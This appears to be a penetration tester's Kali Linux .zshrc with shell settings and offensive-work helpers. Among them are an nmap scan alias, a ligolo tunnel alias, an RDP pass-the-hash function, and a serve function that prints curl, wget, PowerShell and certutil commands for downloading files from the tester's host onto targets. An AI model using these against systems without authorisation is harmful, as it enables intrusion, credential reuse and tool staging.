
# ~/.zshrc file for zsh interactive shells.
# see /usr/share/doc/zsh/examples/zshrc for examples

setopt autocd          # change directory just by typing its name
#setopt correct          # auto correct mistakes
setopt interactivecomments # allow comments in interactive mode
setopt magicequalsubst     # enable filename expansion for arguments of the form ‘anything=expression’
setopt nonomatch           # hide error message if there is no match for the pattern
setopt notify          # report the status of background jobs immediately
setopt numericglobsort     # sort filenames numerically when it makes sense
setopt promptsubst         # enable command substitution in prompt

WORDCHARS='_-' # Don't consider certain characters part of the word

# hide EOL sign ('%')
PROMPT_EOL_MARK=""

# configure key keybindings
bindkey -e                            # emacs key bindings
bindkey ' ' magic-space                   # do history expansion on space
bindkey '^U' backward-kill-line               # ctrl + U
bindkey '^[[3;5~' kill-word               # ctrl + Supr
bindkey '^[[3~' delete-char               # delete
bindkey '^[[1;5C' forward-word                # ctrl + ->
bindkey '^[[1;5D' backward-word               # ctrl + <-
bindkey '^[[5~' beginning-of-buffer-or-history    # page up
bindkey '^[[6~' end-of-buffer-or-history          # page down
bindkey '^[[H' beginning-of-line              # home
bindkey '^[[F' end-of-line                # end
bindkey '^[[Z' undo                     # shift + tab undo last action

# enable completion features
autoload -Uz compinit
compinit -d ~/.cache/zcompdump
zstyle ':completion:*:*:*:*:*' menu select
zstyle ':completion:*' auto-description 'specify: %d'
zstyle ':completion:*' completer _expand _complete
zstyle ':completion:*' format 'Completing %d'
zstyle ':completion:*' group-name ''
zstyle ':completion:*' list-colors ''
zstyle ':completion:*' list-prompt %SAt %p: Hit TAB for more, or the character to insert%s
zstyle ':completion:*' matcher-list 'm:{a-zA-Z}={A-Za-z}'
zstyle ':completion:*' rehash true
zstyle ':completion:*' select-prompt %SScrolling active: current selection at %p%s
zstyle ':completion:*' use-compctl false
zstyle ':completion:*' verbose true
zstyle ':completion:*:kill:*' command 'ps -u $USER -o pid,%cpu,tty,cputime,cmd'

# History configurations
HISTFILE=~/.zsh_history
HISTSIZE=50000
SAVEHIST=100000
setopt hist_expire_dups_first # delete duplicates first when HISTFILE size exceeds HISTSIZE
setopt hist_ignore_dups       # ignore duplicated commands history list
setopt hist_ignore_space      # ignore commands that start with space
setopt hist_verify          # show command with history expansion to user before running it
setopt share_history         # share command history data
setopt INC_APPEND_HISTORY

# force zsh to show the complete history
alias history="history 0"

# configure time format
TIMEFMT=$'\nreal\t%E\nuser\t%U\nsys\t%S\ncpu\t%P'

# make less more friendly for non-text input files, see lesspipe(1)
#[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
    # We have color support; assume it's compliant with Ecma-48
    # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
    # a case would tend to support setf rather than setaf.)
    color_prompt=yes
    else
    color_prompt=
    fi
fi

configure_prompt() {
    prompt_symbol=㉿
    # Skull emoji for root terminal
    #[ "$EUID" -eq 0 ] && prompt_symbol=💀
    case "$PROMPT_ALTERNATIVE" in
    twoline)
        PROMPT=$'%F{%(#.blue.green)}┌──${debian_chroot:+($debian_chroot)─}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))─}(%B%F{%(#.red.blue)}%n'$prompt_symbol$'%m%b%F{%(#.blue.green)})-[%B%F{reset}%(6~.%-1~/…/%4~.%5~)%b%F{%(#.blue.green)}]\n└─%B%(#.%F{red}#.%F{blue}$)%b%F{reset} '
        # Right-side prompt with exit codes and background processes
        #RPROMPT=$'%(?.. %? %F{red}%B⨯%b%F{reset})%(1j. %j %F{yellow}%B⚙%b%F{reset}.)'
        ;;
    oneline)
        PROMPT=$'${debian_chroot:+($debian_chroot)}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))}%B%F{%(#.red.blue)}%n@%m%b%F{reset}:%B%F{%(#.blue.green)}%~%b%F{reset}%(#.#.$) '
        RPROMPT=
        ;;
    backtrack)
        PROMPT=$'${debian_chroot:+($debian_chroot)}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))}%B%F{red}%n@%m%b%F{reset}:%B%F{blue}%~%b%F{reset}%(#.#.$) '
        RPROMPT=
        ;;
    esac
    unset prompt_symbol
}

# The following block is surrounded by two delimiters.
# These delimiters must not be modified. Thanks.
# START KALI CONFIG VARIABLES
PROMPT_ALTERNATIVE=twoline
NEWLINE_BEFORE_PROMPT=yes
# STOP KALI CONFIG VARIABLES

if [ "$color_prompt" = yes ]; then
    # override default virtualenv indicator in prompt
    VIRTUAL_ENV_DISABLE_PROMPT=1

    configure_prompt

    # enable syntax-highlighting
    if [ -f /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ]; then
    . /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
    ZSH_HIGHLIGHT_HIGHLIGHTERS=(main brackets pattern)
    ZSH_HIGHLIGHT_STYLES[default]=none
    ZSH_HIGHLIGHT_STYLES[unknown-token]=underline
    ZSH_HIGHLIGHT_STYLES[reserved-word]=fg=cyan,bold
    ZSH_HIGHLIGHT_STYLES[suffix-alias]=fg=green,underline
    ZSH_HIGHLIGHT_STYLES[global-alias]=fg=green,bold
    ZSH_HIGHLIGHT_STYLES[precommand]=fg=green,underline
    ZSH_HIGHLIGHT_STYLES[commandseparator]=fg=blue,bold
    ZSH_HIGHLIGHT_STYLES[autodirectory]=fg=green,underline
    ZSH_HIGHLIGHT_STYLES[path]=bold
    ZSH_HIGHLIGHT_STYLES[path_pathseparator]=
    ZSH_HIGHLIGHT_STYLES[path_prefix_pathseparator]=
    ZSH_HIGHLIGHT_STYLES[globbing]=fg=blue,bold
    ZSH_HIGHLIGHT_STYLES[history-expansion]=fg=blue,bold
    ZSH_HIGHLIGHT_STYLES[command-substitution]=none
    ZSH_HIGHLIGHT_STYLES[command-substitution-delimiter]=fg=magenta,bold
    ZSH_HIGHLIGHT_STYLES[process-substitution]=none
    ZSH_HIGHLIGHT_STYLES[process-substitution-delimiter]=fg=magenta,bold
    ZSH_HIGHLIGHT_STYLES[single-hyphen-option]=fg=green
    ZSH_HIGHLIGHT_STYLES[double-hyphen-option]=fg=green
    ZSH_HIGHLIGHT_STYLES[back-quoted-argument]=none
    ZSH_HIGHLIGHT_STYLES[back-quoted-argument-delimiter]=fg=blue,bold
    ZSH_HIGHLIGHT_STYLES[single-quoted-argument]=fg=yellow
    ZSH_HIGHLIGHT_STYLES[double-quoted-argument]=fg=yellow
    ZSH_HIGHLIGHT_STYLES[dollar-quoted-argument]=fg=yellow
    ZSH_HIGHLIGHT_STYLES[rc-quote]=fg=magenta
    ZSH_HIGHLIGHT_STYLES[dollar-double-quoted-argument]=fg=magenta,bold
    ZSH_HIGHLIGHT_STYLES[back-double-quoted-argument]=fg=magenta,bold
    ZSH_HIGHLIGHT_STYLES[back-dollar-quoted-argument]=fg=magenta,bold
    ZSH_HIGHLIGHT_STYLES[assign]=none
    ZSH_HIGHLIGHT_STYLES[redirection]=fg=blue,bold
    ZSH_HIGHLIGHT_STYLES[comment]=fg=black,bold
    ZSH_HIGHLIGHT_STYLES[named-fd]=none
    ZSH_HIGHLIGHT_STYLES[numeric-fd]=none
    ZSH_HIGHLIGHT_STYLES[arg0]=fg=cyan
    ZSH_HIGHLIGHT_STYLES[bracket-error]=fg=red,bold
    ZSH_HIGHLIGHT_STYLES[bracket-level-1]=fg=blue,bold
    ZSH_HIGHLIGHT_STYLES[bracket-level-2]=fg=green,bold
    ZSH_HIGHLIGHT_STYLES[bracket-level-3]=fg=magenta,bold
    ZSH_HIGHLIGHT_STYLES[bracket-level-4]=fg=yellow,bold
    ZSH_HIGHLIGHT_STYLES[bracket-level-5]=fg=cyan,bold
    ZSH_HIGHLIGHT_STYLES[cursor-matchingbracket]=standout
    fi
else
    PROMPT='${debian_chroot:+($debian_chroot)}%n@%m:%~%(#.#.$) '
fi
unset color_prompt force_color_prompt

toggle_oneline_prompt(){
    if [ "$PROMPT_ALTERNATIVE" = oneline ]; then
    PROMPT_ALTERNATIVE=twoline
    else
    PROMPT_ALTERNATIVE=oneline
    fi
    configure_prompt
    zle reset-prompt
}
zle -N toggle_oneline_prompt
bindkey ^P toggle_oneline_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*|Eterm|aterm|kterm|gnome*|alacritty)
    TERM_TITLE=$'\e]0;${debian_chroot:+($debian_chroot)}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))}%n@%m: %~\a'
    ;;
*)
    ;;
esac

precmd() {
    # Print the previously configured title
    print -Pnr -- "$TERM_TITLE"

    # Print a new line before the prompt, but only if it is not the first line
    if [ "$NEWLINE_BEFORE_PROMPT" = yes ]; then
    if [ -z "$_NEW_LINE_BEFORE_PROMPT" ]; then
        _NEW_LINE_BEFORE_PROMPT=1
    else
        print ""
    fi
    fi
}

# enable color support of ls, less and man, and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    export LS_COLORS="$LS_COLORS:ow=30;44:" # fix ls color for folders with 777 permissions

    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
    alias diff='diff --color=auto'
    alias ip='ip --color=auto'

    export LESS_TERMCAP_mb=$'\E[1;31m'     # begin blink
    export LESS_TERMCAP_md=$'\E[1;36m'     # begin bold
    export LESS_TERMCAP_me=$'\E[0m'        # reset bold/blink
    export LESS_TERMCAP_so=$'\E[01;33m'    # begin reverse video
    export LESS_TERMCAP_se=$'\E[0m'        # reset reverse video
    export LESS_TERMCAP_us=$'\E[1;32m'     # begin underline
    export LESS_TERMCAP_ue=$'\E[0m'        # reset underline

    # Take advantage of $LS_COLORS for completion as well
    zstyle ':completion:*' list-colors "${(s.:.)LS_COLORS}"
    zstyle ':completion:*:*:kill:*:processes' list-colors '=(#b) #([0-9]#)*=0=01;31'
fi

# enable auto-suggestions based on the history
if [ -f /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh ]; then
    . /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh
    # change suggestion color
    ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE='fg=#999'
fi

# enable command-not-found if installed
if [ -f /etc/zsh_command_not_found ]; then
    . /etc/zsh_command_not_found
fi

# Set default editor to Vscode
EDITOR='code'

# Replace ls with exa
alias ls='exa --group-directories-first --color=always'
alias ll='exa -lh --group-directories-first --color=always'
alias la='exa -la --group-directories-first --color=always'
alias lt='exa -laT --group-directories-first --color=always'  # Tree view
alias lsg='exa --git --long'  # Git-aware view

# Alias for 'batcat' (a syntax-highlighting replacement for 'cat')
alias bat='batcat'

## Autorecon Scanning
alias autorecon='sudo env PATH=$PATH autorecon'

## Default NMAP Scan
alias scan='sudo nmap -sV -sC -p- -Pn -vv -oN nmap.txt'

## Parses the nmap.txt for easy Obsidian paste
parsenmap() {
  local file="${1:-nmap}"
  if [[ ! -r "$file" ]]; then
    echo "File not found or unreadable: $file" >&2
    return 1
  fi

  awk '
  /^[0-9]+\/tcp/ && /open/ {
    portnum = $1
    sub(/\/tcp$/, "", portnum)

    svc = ""; start = 0
    for (i = 1; i <= NF; i++)
      if ($i == "open") { svc = $(i+1); start = i+2; break }
    if (svc == "") svc = "unknown"

    ver = ""
    for (j = start; j <= NF; j++)
      ver = ver (ver ? " " : "") $j
    if (ver == "") ver = "-"

    svc_uc = toupper(svc)
    printf "## TCP/%s %s %s\n", portnum, svc_uc, ver
  }
  ' "$file" | tee /dev/stderr | xsel --clipboard
}

# URL decode function using Python3
alias urldecode='python3 -c "import sys, urllib.parse as ul; \
    print(ul.unquote_plus(sys.argv[1]))"'

# URL encode function using Python3
alias urlencode='python3 -c "import sys, urllib.parse as ul; \
    print (ul.quote_plus(sys.argv[1]))"'

# Shows Tmux shortcuts
alias tmuxshortcuts='echo "
Important tmux Shortcuts:
===========================
Prefix: Ctrl + Space

- Ctrl + n       : Create a new window
- Prefix + W     : Select Window with FZF
- Prefix + 0-9   : Select Window by Number
- Prefix + n     : Move to next window
- Prefix + p     : Move to previous window
- Alt + q        : Split window vertically (Alt + q)
- Alt + w        : Split window horizontally (Alt + w)
- Alt + Right    : Move window to the right (Alt + Right Arrow)
- Alt + Left     : Move window to the left (Alt + Left Arrow)
- Prefix + [     : Enter Copy Mode
- Ctrl + r       : If in copy mode, searches backwards (previous match)
- Ctrl + s       : If in copy mode, searches forwards (next match)
- Space + Arrow  : If in copy mode, selects everywhere.
- Ctrl + Arrow   : If in copy mode, moves and scrolls
"'

alias fzfshortcuts='echo "
Important fzf Shortcuts:
===========================
Ctrl-R          : fuzzy reverse search (history)
Ctrl-T          : fuzzy file search (insert filename)
Alt-C           : cd into selected directory (with previews)
cat file | fzf  : fuzzy content search
cmd ** + tab    : fuzzy autocomplete
Ctrl-/          : toggle preview on/off
Shift-Up        : scroll preview up
Shift-Down      : scroll preview down
"'

alias terminalshortcuts='echo "
Important terminal Shortcuts:
===========================
Ctrl-a          : line start
Ctrl-e          : line end
Ctrl-u          : Delete to start of line
Ctrl-k          : Delete to end of line
Ctrl-w          : Delete previous word
Alt-d           : Delete next word
"'

# Start a Python HTTP server on port 9000
alias pws='python3 -m http.server 9000'

# Set up a tunneling interface using ligolo
alias lgu='sudo ip tuntap add user {{ user }} mode tun ligolo && sudo ip link set ligolo up'   

# Auto Tmux Logging
if [ -n "$TMUX_PANE" ] && [ "$TMUX_PANE_LOGGING" != "1" ]; then
  export TMUX_PANE_LOGGING=1

  # Get timestamps
  DATE_FOLDER=$(date +%d-%b-%Y)          
  TIME_FOLDER=$(date +%Hh%Mm)           

  # Set log root with improved naming
  LOG_ROOT="$HOME/TmuxLogs/$DATE_FOLDER/$TIME_FOLDER"

  # Create colored and normal subfolders
  COLORED_LOGS="$LOG_ROOT/colored"
  NORMAL_LOGS="$LOG_ROOT/normal"
  mkdir -p "$COLORED_LOGS" "$NORMAL_LOGS"

  # Get session/window/pane info
  SESSION=$(tmux display-message -p '#S')
  WINDOW=$(tmux display-message -p '#I')
  PANE=$(tmux display-message -p '#P')

  # Build log file names
  LOG_PREFIX="${SESSION}_win${WINDOW}_pane${PANE}"
  COLOR_LOG="$COLORED_LOGS/${LOG_PREFIX}.log"
  NORMAL_LOG="$NORMAL_LOGS/${LOG_PREFIX}.log"

  # Log both colored and plain output
  tmux pipe-pane -o -t "$TMUX_PANE" "tee \"$COLOR_LOG\" | ansifilter >> \"$NORMAL_LOG\""
fi

# Alias to update background
alias updatebg=/home/kali/.updatewallpaper.sh

xrdp() {
    local ip="" user="" pass="" domain="" ntlm_hash=""
    while getopts ":i:u:p:d:H:h" opt; do
        case "$opt" in
            i) ip="$OPTARG" ;;
            u) user="$OPTARG" ;;
            p) pass="$OPTARG" ;;
            d) domain="$OPTARG" ;;
            H) ntlm_hash="$OPTARG" ;;
            h) printf 'Usage: xrdp -i IP [-u user] [-p pass] [-d domain] [-H ntlm_hash]\n'; return 0 ;;
            \?) printf "Invalid option: -%s\n" "$OPTARG" >&2; return 2 ;;
            :) printf "Option -%s requires an argument.\n" "$OPTARG" >&2; return 2 ;;
        esac
    done

    if [ -z "$ip" ]; then
        printf "Error: IP is required. Usage: xrdp -i IP [-u user] [-p pass] [-d domain] [-H ntlm_hash]\n" >&2
        return 1
    fi

    # If any credential beyond just a username is provided, use xfreerdp
    if [ -n "$ntlm_hash" ]; then
        if [ -z "$user" ]; then
            printf "Error: -H requires -u <user>\n" >&2
            return 1
        fi
        local domain_arg=""
        [ -n "$domain" ] && domain_arg="/d:$domain"
        exec xfreerdp3 /cert:ignore $domain_arg /u:"$user" /pth:"$ntlm_hash" /v:"$ip" /drive:/home/kali/Engagement/Staging,tmp +clipboard +auto-reconnect +dynamic-resolution /title:"RDP - $user@$ip"
    fi

    if [ -n "$pass" ] || [ -n "$domain" ]; then
        if [ -z "$user" ]; then
            printf "Error: password or domain usage requires -u <user>\n" >&2
            return 1
        fi
        local domain_arg=""
        [ -n "$domain" ] && domain_arg="/d:$domain"
        exec xfreerdp3 /cert:ignore $domain_arg /u:"$user" /p:"$pass" /v:"$ip" /drive:/home/kali/Engagement/Staging,tmp +clipboard +auto-reconnect +dynamic-resolution /title:"RDP - $user@$ip"
    fi

    # Otherwise use rdesktop: allow optional username only (no password/domain/hash)
    # Build argv array to avoid eval/quoting issues
    args=(-r "disk:staging=/home/kali/Engagement/Staging" -r "clipboard" -T "RDP - ${user:-unknown}@$ip")
    if [ -n "$user" ]; then
        args+=(-u "$user")
    fi
    args+=("$ip")
    exec rdesktop "${args[@]}"
}

serve() {
  ls
  IP=""
  # try tun0
  if ip -4 addr show dev tun0 2>/dev/null | awk '/inet/ {print $2}' | cut -d/ -f1 | read ip; then :; fi
  # the above read runs in a subshell in some shells; use a safer capture:
  IP=$(ip -4 addr show dev tun0 2>/dev/null | awk '/inet/ {print $2}' | cut -d/ -f1 | head -n1)
  if [ -z "$IP" ]; then
    IP=$(ip -4 addr show scope global 2>/dev/null | awk '/inet/ {print $2}' | cut -d/ -f1 | grep -v '^127\.' | head -n1)
  fi
  # fallback to localhost
  : "${IP:=127.0.0.1}"
  echo "Ready-made download commands:"
    echo
    echo "Linux (curl/wget):"
    echo "  curl -O http://$IP/FILE"
    echo "  wget http://$IP/FILE"

    echo
    echo "Windows (PowerShell and certutil):"
    echo "  iwr http://$IP/FILE -OutFile FILE"
    echo "  certutil -urlcache -split -f http://$IP/FILE FILE"
  echo
  updog -p 80
}

export FZF_DEFAULT_OPTS="
  --preview 'batcat --style=numbers --color=always {}'
  --preview-window=hidden
  --bind 'ctrl-/:toggle-preview,shift-up:preview-up,shift-down:preview-down'
"

# GRC Coloring
[[ -s "/etc/grc.zsh" ]] && source /etc/grc.zsh

 # FZF Functionalities
source /usr/share/doc/fzf/examples/key-bindings.zsh
source /usr/share/doc/fzf/examples/completion.zsh

